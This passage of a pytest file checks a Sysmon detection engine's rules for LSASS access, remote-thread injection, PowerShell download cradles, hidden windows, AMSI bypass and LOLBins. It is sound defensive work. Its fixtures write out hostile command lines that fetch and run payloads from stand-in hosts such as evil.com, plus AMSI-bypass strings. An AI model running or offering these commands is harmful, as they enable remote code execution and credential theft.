"""Phase 2B synthetic false-positive audit + true-positive preservation tests.

Verifies that Phase 2B rule hardening:
  (a) eliminates the benign false-positive patterns found in Checkpoint 1
  (b) preserves true-positive detection for every tightened rule

No live Sysmon required — all events are constructed in-memory using the same
typed dataclasses the normalizer produces from real XML.

Rules covered and change summary:
    HIGH-risk (redesigned — multi-condition, new operators):
        API_OPEN_PROCESS_SUSPICIOUS_ACCESS_001
            Before: cross-basename + access mask — fired on explorer->msedge,
                    svchost->RuntimeBroker, services->svchost during live VM
                    baseline (browser false-positive flood).
            After:  access mask AND target ends_with_any [lsass, winlogon, csrss]
                    AND source not_ends_with_any [MsMpEng, csrss, lsass,
                    winlogon, wininit] — 0 FP hits on live-VM patterns.
        API_CREATE_REMOTE_THREAD_001
            Before: source_image regex ".+" — fired on chrome JIT threads
                    and WerFault crash reporting (2 FP hits).
            After:  requires not_same_basename AND source not in
                    [WerFault, csrss] — 0 FP hits.

    HIGH-risk (pulled forward from Phase 4B, redesigned):
        PS_DOWNLOAD_CRADLE_001
            Before: PS image + download string alone — fired on benign admin
                    curl/wget/iwr from explorer.exe (4 FP hits).
            After:  additionally requires parent outside [explorer, taskeng,
                    taskhostw, svchost] — 0 FP hits from interactive use.
        NET_POWERSHELL_HTTP_001
            Before: PS + initiated + port 80/443 alone — fired on Update-Help,
                    PSGallery, Windows Update (4 FP hits).
            After:  additionally requires destination outside known-benign
                    Microsoft/ecosystem domain list; allow_null preserves
                    IP-direct C2 alerting — 0 FP hits for named MS domains.

    MEDIUM-risk (pulled forward from Phase 4B, redesigned):
        PS_HIDDEN_WINDOW_001
            Before: PS + -WindowStyle Hidden alone — fired on scheduled tasks
                    (2 FP hits).
            After:  additionally requires parent outside [taskeng, taskhostw,
                    svchost] — 0 FP hits from Task Scheduler.

    Unchanged (zero FP, regression smoke tests):
        PS_ENCODED_CMD_001
        PS_AMSI_BYPASS_001
        LOLBIN_MSHTA_001
        LOLBIN_RUNDLL32_SUSPICIOUS_001
        LOLBIN_REGSVR32_001
        LOLBIN_CERTUTIL_001
        CHAIN_OFFICE_POWERSHELL_001
        CHAIN_OFFICE_CMD_001
        CHAIN_SCRIPT_HOST_CMD_001
        CHAIN_SCRIPT_HOST_POWERSHELL_001
"""

from __future__ import annotations

from pathlib import Path

import pytest

from normalizer.models import (
    CreateRemoteThreadEvent,
    NetworkConnectEvent,
    OpenProcessEvent,
    ProcessCreateEvent,
)
from rules.engine import RuleEngine


# ---------------------------------------------------------------------------
# Shared helpers
# ---------------------------------------------------------------------------

def _make_proc(**kwargs) -> ProcessCreateEvent:
    defaults: dict = {
        "event_id": 1,
        "utc_time": "2026-06-23 10:00:00.000",
        "computer": "AUDIT-HOST",
        "process_guid": "{audit-guid-proc}",
        "process_id": 1000,
        "image": "C:\\Windows\\System32\\cmd.exe",
        "command_line": "cmd.exe",
        "current_directory": "C:\\",
        "user": "AUDIT-HOST\\User",
        "parent_process_id": 5000,
        "parent_image": "C:\\Windows\\explorer.exe",
        "parent_command_line": "explorer.exe",
        "integrity_level": "Medium",
        "hashes": None,
    }
    defaults.update(kwargs)
    return ProcessCreateEvent(**defaults)


def _make_net(**kwargs) -> NetworkConnectEvent:
    defaults: dict = {
        "event_id": 3,
        "utc_time": "2026-06-23 10:00:00.000",
        "computer": "AUDIT-HOST",
        "process_guid": "{audit-guid-net}",
        "process_id": 2000,
        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "user": "AUDIT-HOST\\User",
        "protocol": "tcp",
        "initiated": True,
        "source_ip": "192.168.1.100",
        "source_port": 54000,
        "destination_ip": "203.0.113.10",
        "destination_hostname": "c2.example.com",
        "destination_port": 443,
    }
    defaults.update(kwargs)
    return NetworkConnectEvent(**defaults)


def _make_open_process(**kwargs) -> OpenProcessEvent:
    defaults: dict = {
        "event_id": 10,
        "utc_time": "2026-06-23 10:00:00.000",
        "computer": "AUDIT-HOST",
        "source_process_id": 1234,
        "source_image": "C:\\Windows\\System32\\powershell.exe",
        "target_process_id": 900,
        "target_image": "C:\\Windows\\System32\\lsass.exe",
        "granted_access": "0x1410",
        "call_trace": None,
    }
    defaults.update(kwargs)
    return OpenProcessEvent(**defaults)


def _make_crt(**kwargs) -> CreateRemoteThreadEvent:
    defaults: dict = {
        "event_id": 8,
        "utc_time": "2026-06-23 10:00:00.000",
        "computer": "AUDIT-HOST",
        "source_process_id": 3000,
        "source_image": "C:\\Windows\\System32\\powershell.exe",
        "target_process_id": 4000,
        "target_image": "C:\\Windows\\explorer.exe",
        "new_thread_id": 5678,
        "start_address": "0x7fff1234abcd",
        "start_module": None,
        "start_function": None,
    }
    defaults.update(kwargs)
    return CreateRemoteThreadEvent(**defaults)


EDGE   = r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
CHROME = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
PS     = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
CMD    = r"C:\Windows\System32\cmd.exe"
CSRSS  = r"C:\Windows\System32\csrss.exe"
CONHOST = r"C:\Windows\System32\conhost.exe"
SVCHOST = r"C:\Windows\System32\svchost.exe"
MSMPENG = r"C:\Program Files\Windows Defender\MsMpEng.exe"
WINLOGON = r"C:\Windows\System32\winlogon.exe"
WININIT = r"C:\Windows\System32\wininit.exe"
LSASS   = r"C:\Windows\System32\lsass.exe"
EXPLORER = r"C:\Windows\explorer.exe"
SERVICES = r"C:\Windows\System32\services.exe"
IDENTITY_HELPER = r"C:\Program Files (x86)\Microsoft\Edge\Application\identity_helper.exe"
ELEVATION_SERVICE = r"C:\Program Files (x86)\Microsoft\Edge\Application\elevation_service.exe"
APPFRAMEHOST = r"C:\Windows\System32\ApplicationFrameHost.exe"
RUNTIMEBROKER = r"C:\Windows\System32\RuntimeBroker.exe"
WINSTORE = r"C:\Program Files\WindowsApps\WinStore.App.exe"
PYTHON_RT = r"C:\python_runtime\python.exe"
WERFAULT = r"C:\Windows\System32\WerFault.exe"


@pytest.fixture(scope="module")
def engine() -> RuleEngine:
    eng = RuleEngine(Path("rules"))
    eng.load()
    return eng


def _hits(engine: RuleEngine, event, rule_id: str) -> bool:
    return any(h.rule_id == rule_id for h in engine.evaluate(event))


# ===========================================================================
# API_OPEN_PROCESS_SUSPICIOUS_ACCESS_001
# Redesigned: access mask AND target ends_with_any [lsass, winlogon, csrss]
# AND source not_ends_with_any [MsMpEng, csrss, lsass, winlogon, wininit]
# ===========================================================================

class TestOpenProcessRule:
    RULE = "API_OPEN_PROCESS_SUSPICIOUS_ACCESS_001"

    # --- Benign: must NOT fire (false-positive elimination) ---

    def test_benign_read_control_0x40_does_not_fire(self, engine: RuleEngine):
        """0x40 READ_CONTROL — not in suspicious mask list; must not fire."""
        assert not _hits(engine, _make_open_process(granted_access="0x40"), self.RULE)

    def test_benign_synchronize_0x08_does_not_fire(self, engine: RuleEngine):
        """0x08 SYNCHRONIZE — not in suspicious mask list; must not fire."""
        assert not _hits(engine, _make_open_process(granted_access="0x08"), self.RULE)

    def test_benign_query_limited_info_does_not_fire(self, engine: RuleEngine):
        """0x1000 PROCESS_QUERY_LIMITED_INFORMATION — benign mask."""
        assert not _hits(engine, _make_open_process(granted_access="0x1000"), self.RULE)

    def test_benign_msedge_sibling_0x1fffff_does_not_fire(self, engine: RuleEngine):
        """msedge->msedge same-image-name: target not security-sensitive."""
        event = _make_open_process(
            source_image=EDGE, target_image=EDGE, granted_access="0x1fffff",
        )
        assert not _hits(engine, event, self.RULE)

    def test_benign_msedge_sibling_0x1f0fff_does_not_fire(self, engine: RuleEngine):
        """msedge->msedge with alternate full-access mask."""
        event = _make_open_process(
            source_image=EDGE, target_image=EDGE, granted_access="0x1f0fff",
        )
        assert not _hits(engine, event, self.RULE)

    def test_benign_chrome_sibling_does_not_fire(self, engine: RuleEngine):
        """chrome->chrome same-image-name sibling."""
        event = _make_open_process(
            source_image=CHROME, target_image=CHROME, granted_access="0x1fffff",
        )
        assert not _hits(engine, event, self.RULE)

    def test_benign_svchost_sibling_does_not_fire(self, engine: RuleEngine):
        """svchost->svchost same-image-name pair (common IPC between service groups)."""
        event = _make_open_process(
            source_image=SVCHOST, target_image=SVCHOST, granted_access="0x1fffff",
        )
        assert not _hits(engine, event, self.RULE)

    def test_benign_conhost_attaches_to_cmd_does_not_fire(self, engine: RuleEngine):
        """conhost->cmd 0x1fffff: target not security-sensitive."""
        event = _make_open_process(
            source_image=CONHOST, target_image=CMD, granted_access="0x1fffff",
        )
        assert not _hits(engine, event, self.RULE)

    def test_benign_powershell_opens_conhost_does_not_fire(self, engine: RuleEngine):
        """powershell->conhost 0x1fffff: target not in security-sensitive list."""
        event = _make_open_process(
            source_image=PS, target_image=CONHOST, granted_access="0x1fffff",
        )
        assert not _hits(engine, event, self.RULE)

    # --- Live-VM-derived benign patterns (must NOT fire) ---

    def test_fp_explorer_launches_edge(self, engine: RuleEngine):
        """explorer->msedge 0x1fffff: shell launching user application."""
        event = _make_open_process(
            source_image=EXPLORER, target_image=EDGE, granted_access="0x1fffff",
        )
        assert not _hits(engine, event, self.RULE)

    def test_fp_svchost_manages_edge(self, engine: RuleEngine):
        """svchost->msedge 0x1fffff: service host managing browser process."""
        event = _make_open_process(
            source_image=SVCHOST, target_image=EDGE, granted_access="0x1fffff",
        )
        assert not _hits(engine, event, self.RULE)

    def test_fp_services_manages_svchost(self, engine: RuleEngine):
        """services->svchost 0x1fffff: SCM managing service host."""
        event = _make_open_process(
            source_image=SERVICES, target_image=SVCHOST, granted_access="0x1fffff",
        )
        assert not _hits(engine, event, self.RULE)

    def test_fp_edge_opens_identity_helper(self, engine: RuleEngine):
        """msedge->identity_helper 0x1fffff: browser family cross-process."""
        event = _make_open_process(
            source_image=EDGE, target_image=IDENTITY_HELPER, granted_access="0x1fffff",
        )
        assert not _hits(engine, event, self.RULE)

    def test_fp_explorer_appframehost(self, engine: RuleEngine):
        """explorer->ApplicationFrameHost 0x1410: UWP shell frame management."""
        event = _make_open_process(
            source_image=EXPLORER, target_image=APPFRAMEHOST, granted_access="0x1410",
        )
        assert not _hits(engine, event, self.RULE)

    def test_fp_services_elevation_service(self, engine: RuleEngine):
        """services->elevation_service 0x1fffff: SCM managing Edge elevation service."""
        event = _make_open_process(
            source_image=SERVICES, target_image=ELEVATION_SERVICE, granted_access="0x1fffff",
        )
        assert not _hits(engine, event, self.RULE)

    def test_fp_svchost_runtimebroker(self, engine: RuleEngine):
        """svchost->RuntimeBroker 0x1fffff: service host managing runtime broker."""
        event = _make_open_process(
            source_image=SVCHOST, target_image=RUNTIMEBROKER, granted_access="0x1fffff",
        )
        assert not _hits(engine, event, self.RULE)

    def test_fp_svchost_winstore(self, engine: RuleEngine):
        """svchost->WinStore.App 0x1fffff: service host managing Store app."""
        event = _make_open_process(
            source_image=SVCHOST, target_image=WINSTORE, granted_access="0x1fffff",
        )
        assert not _hits(engine, event, self.RULE)

    def test_fp_defender_opens_lsass(self, engine: RuleEngine):
        """MsMpEng->lsass 0x1fffff: Windows Defender memory scan (source exclusion)."""
        event = _make_open_process(
            source_image=MSMPENG, target_image=LSASS, granted_access="0x1fffff",
        )
        assert not _hits(engine, event, self.RULE)

    def test_fp_wininit_opens_lsass(self, engine: RuleEngine):
        """wininit->lsass 0x1fffff: normal boot-time initialization (source exclusion)."""
        event = _make_open_process(
            source_image=WININIT, target_image=LSASS, granted_access="0x1fffff",
        )
        assert not _hits(engine, event, self.RULE)

    def test_benign_winlogon_opens_lsass_does_not_fire(self, engine: RuleEngine):
        """winlogon->lsass 0x1410: normal authentication path (source exclusion)."""
        event = _make_open_process(
            source_image=WINLOGON, target_image=LSASS, granted_access="0x1410",
        )
        assert not _hits(engine, event, self.RULE)

    def test_benign_csrss_session_management_does_not_fire(self, engine: RuleEngine):
        """csrss->lsass 0x1fffff: Windows session management (source exclusion)."""
        event = _make_open_process(
            source_image=CSRSS, target_image=LSASS, granted_access="0x1fffff",
        )
        assert not _hits(engine, event, self.RULE)

    # --- True positive: MUST fire (technique detection preserved) ---

    def test_tp_powershell_opens_lsass_allacc(self, engine: RuleEngine):
        """powershell->lsass 0x1fffff: PowerShell credential dump attempt."""
        event = _make_open_process(
            source_image=PS, target_image=LSASS, granted_access="0x1fffff",
        )
        assert _hits(engine, event, self.RULE)

    def test_tp_powershell_opens_lsass_rw(self, engine: RuleEngine):
        """powershell->lsass 0x1f0fff: LSASS memory read."""
        event = _make_open_process(
            source_image=PS, target_image=LSASS, granted_access="0x1f0fff",
        )
        assert _hits(engine, event, self.RULE)

    def test_tp_cmd_opens_lsass(self, engine: RuleEngine):
        """cmd->lsass 0x1410: cmd-side injection attempt."""
        event = _make_open_process(
            source_image=CMD, target_image=LSASS, granted_access="0x1410",
        )
        assert _hits(engine, event, self.RULE)

    def test_tp_implant_opens_lsass(self, engine: RuleEngine):
        """implant.exe->lsass 0x1fffff: unknown binary targeting LSASS."""
        event = _make_open_process(
            source_image=r"C:\Users\user\AppData\Local\Temp\implant.exe",
            target_image=LSASS,
            granted_access="0x1fffff",
        )
        assert _hits(engine, event, self.RULE)

    def test_tp_unknown_opens_winlogon(self, engine: RuleEngine):
        """runner.exe->winlogon 0x1fffff: session hijack attempt."""
        event = _make_open_process(
            source_image=r"C:\Users\user\Downloads\runner.exe",
            target_image=WINLOGON,
            granted_access="0x1fffff",
        )
        assert _hits(engine, event, self.RULE)

    def test_tp_python_opens_lsass(self, engine: RuleEngine):
        """python.exe->lsass 0x1f0fff: scripted credential access."""
        event = _make_open_process(
            source_image=PYTHON_RT, target_image=LSASS, granted_access="0x1f0fff",
        )
        assert _hits(engine, event, self.RULE)

    def test_malicious_process_all_access_fires(self, engine: RuleEngine):
        """0x1f0fff PROCESS_ALL_ACCESS from unknown attacker process -> lsass."""
        event = _make_open_process(
            source_image=r"C:\Users\User\AppData\Local\Temp\implant.exe",
            target_image=LSASS,
            granted_access="0x1f0fff",
        )
        assert _hits(engine, event, self.RULE)

    def test_malicious_injection_combo_fires(self, engine: RuleEngine):
        """0x1410 injection combo from foreign process -> lsass."""
        event = _make_open_process(
            source_image=r"C:\Users\User\Downloads\loader.exe",
            target_image=LSASS,
            granted_access="0x1410",
        )
        assert _hits(engine, event, self.RULE)

    def test_malicious_combo_in_compound_value_fires(self, engine: RuleEngine):
        """0x1410 substring inside a compound access string still fires."""
        event = _make_open_process(
            source_image=r"C:\temp\injector.exe",
            target_image=LSASS,
            granted_access="0x1410|0x40",
        )
        assert _hits(engine, event, self.RULE)

    def test_malicious_msedge_targets_lsass_fires(self, engine: RuleEngine):
        """msedge->lsass 0x1410: compromised browser credential access must fire."""
        event = _make_open_process(
            source_image=EDGE, target_image=LSASS, granted_access="0x1410",
        )
        assert _hits(engine, event, self.RULE)


# ===========================================================================
# API_CREATE_REMOTE_THREAD_001
# Redesigned: source_image ".+" AND not_same_basename AND source not in
# [WerFault, csrss]
# Before/after: old rule fired on any Event ID 8.
# ===========================================================================

class TestCreateRemoteThreadRule:
    RULE = "API_CREATE_REMOTE_THREAD_001"

    # --- Benign: must NOT fire ---

    def test_chrome_sibling_jit_thread_does_not_fire(self, engine: RuleEngine):
        """chrome->chrome same-image-name: renderer JIT thread creation (benign).
        Before fix: fired. After fix: not_same_basename excludes it."""
        event = _make_crt(source_image=CHROME, target_image=CHROME)
        assert not _hits(engine, event, self.RULE), (
            "Same-image-name CRT (Chrome JIT thread) must not fire"
        )

    def test_edge_sibling_does_not_fire(self, engine: RuleEngine):
        """msedge->msedge same-image-name sandbox thread."""
        event = _make_crt(source_image=EDGE, target_image=EDGE)
        assert not _hits(engine, event, self.RULE)

    def test_werfault_crash_reporting_does_not_fire(self, engine: RuleEngine):
        """WerFault->msedge: Windows crash reporting injects diagnostic thread.
        Before fix: fired. After fix: source exclusion covers WerFault."""
        event = _make_crt(source_image=WERFAULT, target_image=EDGE)
        assert not _hits(engine, event, self.RULE), (
            "WerFault crash reporting must not fire (source exclusion)"
        )

    def test_csrss_session_thread_does_not_fire(self, engine: RuleEngine):
        """csrss creating a session-management thread (source exclusion)."""
        event = _make_crt(source_image=CSRSS, target_image=SVCHOST)
        assert not _hits(engine, event, self.RULE)

    # --- True positive: MUST fire ---

    def test_cross_image_injection_fires(self, engine: RuleEngine):
        """powershell->explorer.exe different basenames: classic injection."""
        event = _make_crt()  # default: powershell->explorer
        assert _hits(engine, event, self.RULE), (
            "Cross-image CRT (powershell->explorer) MUST fire"
        )

    def test_implant_targets_svchost_fires(self, engine: RuleEngine):
        """Unknown implant creating thread in svchost.exe."""
        event = _make_crt(
            source_image=r"C:\Users\User\AppData\Local\Temp\implant.exe",
            target_image=SVCHOST,
        )
        assert _hits(engine, event, self.RULE)

    def test_implant_targets_lsass_fires(self, engine: RuleEngine):
        """Thread injection into lsass.exe — credential dumping technique."""
        event = _make_crt(
            source_image=r"C:\ProgramData\evil.exe",
            target_image=LSASS,
        )
        assert _hits(engine, event, self.RULE)

    def test_event_id_1_does_not_match_crt_rule(self, engine: RuleEngine):
        """ProcessCreate events (Event ID 1) must not match the CRT rule."""
        assert not _hits(engine, _make_proc(), self.RULE)


# ===========================================================================
# NET_POWERSHELL_HTTP_001
# Redesigned: PS + initiated + port 80/443 + destination hostname exclusion.
# allow_null on hostname preserves IP-direct C2 alerting.
# ===========================================================================

class TestNetworkPowerShellHTTPRule:
    RULE = "NET_POWERSHELL_HTTP_001"

    # --- Phase 2B port-fix regression (unchanged, must still pass) ---

    def test_port_80_fires_to_suspicious_host(self, engine: RuleEngine):
        """Outbound PS to port 80 targeting a suspicious host MUST fire."""
        event = _make_net(destination_port=80, destination_hostname="c2.attacker.net")
        assert _hits(engine, event, self.RULE)

    def test_port_443_fires_to_suspicious_host(self, engine: RuleEngine):
        """Outbound PS to port 443 targeting a non-benign host MUST fire."""
        event = _make_net(destination_port=443, destination_hostname="c2.example.com")
        assert _hits(engine, event, self.RULE)

    def test_port_8080_does_not_fire(self, engine: RuleEngine):
        """Port 8080 — substring fix from Phase 2B must still hold."""
        event = _make_net(destination_port=8080)
        assert not _hits(engine, event, self.RULE)

    def test_port_8443_does_not_fire(self, engine: RuleEngine):
        event = _make_net(destination_port=8443)
        assert not _hits(engine, event, self.RULE)

    def test_inbound_port_443_does_not_fire(self, engine: RuleEngine):
        event = _make_net(destination_port=443, initiated=False)
        assert not _hits(engine, event, self.RULE)

    def test_non_powershell_port_443_does_not_fire(self, engine: RuleEngine):
        event = _make_net(destination_port=443, image=CHROME)
        assert not _hits(engine, event, self.RULE)

    # --- Benign destinations: must NOT fire (false-positive elimination) ---

    def test_benign_update_help_microsoft_com_does_not_fire(self, engine: RuleEngine):
        """PS Update-Help -> update.microsoft.com:443 must not fire."""
        event = _make_net(
            destination_port=443,
            destination_hostname="update.microsoft.com",
            destination_ip="13.107.4.50",
        )
        assert not _hits(engine, event, self.RULE), (
            "Update-Help (update.microsoft.com) must not fire after hostname exclusion"
        )

    def test_benign_psgallery_does_not_fire(self, engine: RuleEngine):
        """PS Install-Module -> powershellgallery.com:443 must not fire."""
        event = _make_net(
            destination_port=443,
            destination_hostname="www.powershellgallery.com",
            destination_ip="13.67.143.117",
        )
        assert not _hits(engine, event, self.RULE)

    def test_benign_windows_update_does_not_fire(self, engine: RuleEngine):
        event = _make_net(
            destination_port=443,
            destination_hostname="windowsupdate.microsoft.com",
        )
        assert not _hits(engine, event, self.RULE)

    def test_benign_office365_does_not_fire(self, engine: RuleEngine):
        event = _make_net(
            destination_port=443,
            destination_hostname="outlook.office365.com",
        )
        assert not _hits(engine, event, self.RULE)

    # --- IP-direct connections: MUST still fire (allow_null preserves alerting) ---

    def test_ip_direct_c2_port_443_fires(self, engine: RuleEngine):
        """PS connecting directly to an IP on port 443 with no hostname resolved.
        allow_null on destination_hostname condition means None passes (fires)."""
        event = _make_net(
            destination_port=443,
            destination_hostname=None,
            destination_ip="185.220.101.42",
        )
        assert _hits(engine, event, self.RULE), (
            "IP-direct C2 (no hostname) MUST fire — allow_null on hostname condition"
        )

    def test_ip_direct_c2_port_80_fires(self, engine: RuleEngine):
        """PS connecting directly to an IP on port 80 with no hostname."""
        event = _make_net(
            destination_port=80,
            destination_hostname=None,
            destination_ip="198.51.100.5",
        )
        assert _hits(engine, event, self.RULE)


# ===========================================================================
# PS_DOWNLOAD_CRADLE_001
# Redesigned: PS + download indicator + parent_image not in benign-parent set.
# allow_null on parent_image means unknown parent fires.
# ===========================================================================

class TestPowerShellDownloadCradleRule:
    RULE = "PS_DOWNLOAD_CRADLE_001"

    # --- Benign: must NOT fire (false-positive elimination) ---

    def test_curl_from_explorer_does_not_fire(self, engine: RuleEngine):
        """User running 'curl https://...' interactively from explorer.exe.
        Before fix: fired. After fix: parent=explorer.exe is in exclusion list."""
        event = _make_proc(
            image=PS,
            command_line="powershell.exe -c curl https://raw.githubusercontent.com/user/repo/main/setup.ps1",
            parent_image=EXPLORER,
        )
        assert not _hits(engine, event, self.RULE), (
            "curl from explorer.exe (interactive user) must not fire"
        )

    def test_wget_from_explorer_does_not_fire(self, engine: RuleEngine):
        """User running 'wget https://...' interactively."""
        event = _make_proc(
            image=PS,
            command_line="powershell.exe -c wget https://packages.microsoft.com/update",
            parent_image=EXPLORER,
        )
        assert not _hits(engine, event, self.RULE)

    def test_iwr_from_explorer_does_not_fire(self, engine: RuleEngine):
        """User running 'iwr https://...' interactively."""
        event = _make_proc(
            image=PS,
            command_line="powershell.exe -c iwr https://gallery.technet.microsoft.com/mod",
            parent_image=EXPLORER,
        )
        assert not _hits(engine, event, self.RULE)

    def test_webclient_from_svchost_does_not_fire(self, engine: RuleEngine):
        """SCCM/WSUS agent using Net.WebClient from svchost parent."""
        event = _make_proc(
            image=PS,
            command_line='powershell.exe -c $w=New-Object System.Net.WebClient; $w.DownloadFile("https://wsus.corp/upd","C:\\temp\\upd.msi")',
            parent_image=SVCHOST,
        )
        assert not _hits(engine, event, self.RULE)

    def test_invoke_webrequest_from_taskeng_does_not_fire(self, engine: RuleEngine):
        """Scheduled task using Invoke-WebRequest from taskeng.exe."""
        event = _make_proc(
            image=PS,
            command_line="powershell.exe -c Invoke-WebRequest https://cdn.example.com/update -OutFile C:\\temp\\update.msi",
            parent_image=r"C:\Windows\System32\taskeng.exe",
        )
        assert not _hits(engine, event, self.RULE)

    def test_idle_powershell_does_not_fire(self, engine: RuleEngine):
        """Bare powershell.exe with no download indicators."""
        event = _make_proc(image=PS, command_line="powershell.exe")
        assert not _hits(engine, event, self.RULE)

    def test_non_powershell_does_not_fire(self, engine: RuleEngine):
        """cmd.exe with 'curl' in the command line — image filter protects."""
        event = _make_proc(image=CMD, command_line="cmd.exe /c curl http://evil.com")
        assert not _hits(engine, event, self.RULE)

    # --- True positive: MUST fire (technique detection preserved) ---

    def test_download_string_from_cmd_fires(self, engine: RuleEngine):
        """IEX+DownloadString from cmd.exe parent — classic fileless cradle.
        After redesign: cmd.exe is not in the exclusion list → fires."""
        event = _make_proc(
            image=PS,
            command_line="powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/p')\"",
            parent_image=CMD,
        )
        assert _hits(engine, event, self.RULE)

    def test_invoke_webrequest_from_cmd_fires(self, engine: RuleEngine):
        """Invoke-WebRequest to attacker URL from cmd.exe parent."""
        event = _make_proc(
            image=PS,
            command_line="powershell -c Invoke-WebRequest http://c2.evil.com/payload -OutFile C:\\temp\\p.exe",
            parent_image=CMD,
        )
        assert _hits(engine, event, self.RULE)

    def test_webclient_download_file_from_cmd_fires(self, engine: RuleEngine):
        """Net.WebClient DownloadFile from cmd.exe parent."""
        event = _make_proc(
            image=PS,
            command_line="powershell -c $w=New-Object Net.WebClient;$w.DownloadFile('http://evil.com/x','C:\\x')",
            parent_image=CMD,
        )
        assert _hits(engine, event, self.RULE)

    def test_curl_piped_to_iex_from_cmd_fires(self, engine: RuleEngine):
        """curl piped to IEX from cmd.exe parent — download and execute."""
        event = _make_proc(
            image=PS,
            command_line="powershell -c curl http://evil.com/payload | iex",
            parent_image=CMD,
        )
        assert _hits(engine, event, self.RULE)

    def test_download_from_unknown_parent_fires(self, engine: RuleEngine):
        """PS download cradle with unknown/staged binary parent.
        allow_null: parent_image=None is treated as suspicious."""
        event = _make_proc(
            image=PS,
            command_line="powershell.exe -c DownloadString('http://c2.example.com/stage2')",
            parent_image=None,
        )
        assert _hits(engine, event, self.RULE), (
            "Unknown parent (None) with download indicator MUST fire — allow_null"
        )


# ===========================================================================
# PS_HIDDEN_WINDOW_001
# Redesigned: PS + -WindowStyle Hidden + parent not in [taskeng, taskhostw,
# svchost]. allow_null on parent fires for unknown lineage.
# ===========================================================================

class TestPowerShellHiddenWindowRule:
    RULE = "PS_HIDDEN_WINDOW_001"

    # --- Benign: must NOT fire (false-positive elimination) ---

    def test_scheduled_task_taskeng_does_not_fire(self, engine: RuleEngine):
        """Task Scheduler (taskeng.exe) running PS with -WindowStyle Hidden.
        Before fix: fired. After fix: taskeng is in parent exclusion list."""
        event = _make_proc(
            image=PS,
            command_line='powershell.exe -NonInteractive -WindowStyle Hidden -Command "& C:\\Scripts\\Backup.ps1"',
            parent_image=r"C:\Windows\System32\taskeng.exe",
        )
        assert not _hits(engine, event, self.RULE), (
            "Task Scheduler (taskeng.exe) hidden-window PS must not fire"
        )

    def test_scheduled_task_svchost_does_not_fire(self, engine: RuleEngine):
        """svchost-hosted Task Scheduler running PS with -W Hidden."""
        event = _make_proc(
            image=PS,
            command_line='powershell.exe -W Hidden -File C:\\Scripts\\Cleanup.ps1',
            parent_image=SVCHOST,
        )
        assert not _hits(engine, event, self.RULE), (
            "svchost (Task Scheduler service) hidden-window PS must not fire"
        )

    def test_taskhostw_does_not_fire(self, engine: RuleEngine):
        """taskhostw.exe (Windows 10+ Task Host) running scheduled PS script."""
        event = _make_proc(
            image=PS,
            command_line='powershell.exe -WindowStyle Hidden -File C:\\Scripts\\Nightly.ps1',
            parent_image=r"C:\Windows\System32\taskhostw.exe",
        )
        assert not _hits(engine, event, self.RULE)

    # --- True positive: MUST fire (technique detection preserved) ---

    def test_hidden_window_from_cmd_fires(self, engine: RuleEngine):
        """cmd.exe spawning hidden PS — phishing execution chain.
        cmd.exe is not in the exclusion list → fires."""
        event = _make_proc(
            image=PS,
            command_line='powershell.exe -W Hidden -enc JABzAD0AJwBzAHQAYQBnAGUAMgAnAA==',
            parent_image=CMD,
        )
        assert _hits(engine, event, self.RULE)

    def test_hidden_window_from_wscript_fires(self, engine: RuleEngine):
        """wscript.exe spawning hidden PS — script-based technique."""
        event = _make_proc(
            image=PS,
            command_line='powershell.exe -WindowStyle Hidden -c IEX $payload',
            parent_image=r"C:\Windows\System32\wscript.exe",
        )
        assert _hits(engine, event, self.RULE)

    def test_hidden_window_unknown_parent_fires(self, engine: RuleEngine):
        """Unknown parent launching hidden PS — allow_null preserves the alert."""
        event = _make_proc(
            image=PS,
            command_line='powershell.exe -WindowStyle Hidden -enc dGVzdA==',
            parent_image=None,
        )
        assert _hits(engine, event, self.RULE)


# ===========================================================================
# PS_ENCODED_CMD_001 — unchanged, regression smoke
# ===========================================================================

class TestPowerShellEncodedCmdRule:
    RULE = "PS_ENCODED_CMD_001"

    def test_encoded_command_fires(self, engine: RuleEngine):
        event = _make_proc(image=PS, command_line="powershell.exe -EncodedCommand JABzAD0AJwBoAGUAbABsAGMAbwBkAGUAJwA=")
        assert _hits(engine, event, self.RULE)

    def test_enc_short_form_fires(self, engine: RuleEngine):
        event = _make_proc(image=PS, command_line="powershell.exe -enc JABzAD0A")
        assert _hits(engine, event, self.RULE)

    def test_ec_short_form_fires(self, engine: RuleEngine):
        event = _make_proc(image=PS, command_line="powershell.exe -ec JABzAD0A")
        assert _hits(engine, event, self.RULE)

    def test_benign_get_process_does_not_fire(self, engine: RuleEngine):
        event = _make_proc(image=PS, command_line="powershell.exe Get-Process")
        assert not _hits(engine, event, self.RULE)

    def test_benign_command_flag_does_not_fire(self, engine: RuleEngine):
        event = _make_proc(image=PS, command_line='powershell.exe -Command "Get-ChildItem C:\\"')
        assert not _hits(engine, event, self.RULE)


# ===========================================================================
# PS_AMSI_BYPASS_001 — unchanged, regression smoke
# ===========================================================================

class TestAMSIBypassRule:
    RULE = "PS_AMSI_BYPASS_001"

    def test_amsi_init_failed_fires(self, engine: RuleEngine):
        event = _make_proc(image=PS, command_line="powershell.exe -c [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')")
        assert _hits(engine, event, self.RULE)

    def test_amsi_scan_buffer_fires(self, engine: RuleEngine):
        event = _make_proc(image=PS, command_line="powershell.exe -c $b=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer; AmsiScanBuffer")
        assert _hits(engine, event, self.RULE)

    def test_benign_powershell_does_not_fire(self, engine: RuleEngine):
        event = _make_proc(image=PS, command_line="powershell.exe Get-Help")
        assert not _hits(engine, event, self.RULE)


# ===========================================================================
# LOLBIN regression smoke — unchanged rules
# ===========================================================================

class TestLOLBinRegressionSmoke:

    def test_mshta_fires(self, engine: RuleEngine):
        event = _make_proc(image=r"C:\Windows\System32\mshta.exe", command_line="mshta.exe http://evil.com/payload.hta")
        assert _hits(engine, event, "LOLBIN_MSHTA_001")

    def test_rundll32_javascript_fires(self, engine: RuleEngine):
        event = _make_proc(
            image=r"C:\Windows\System32\rundll32.exe",
            command_line='rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";evil()',
        )
        assert _hits(engine, event, "LOLBIN_RUNDLL32_SUSPICIOUS_001")

    def test_rundll32_printui_does_not_fire(self, engine: RuleEngine):
        """Legitimate rundll32 call must not fire (no .dll, fix from Phase 2B)."""
        event = _make_proc(
            image=r"C:\Windows\System32\rundll32.exe",
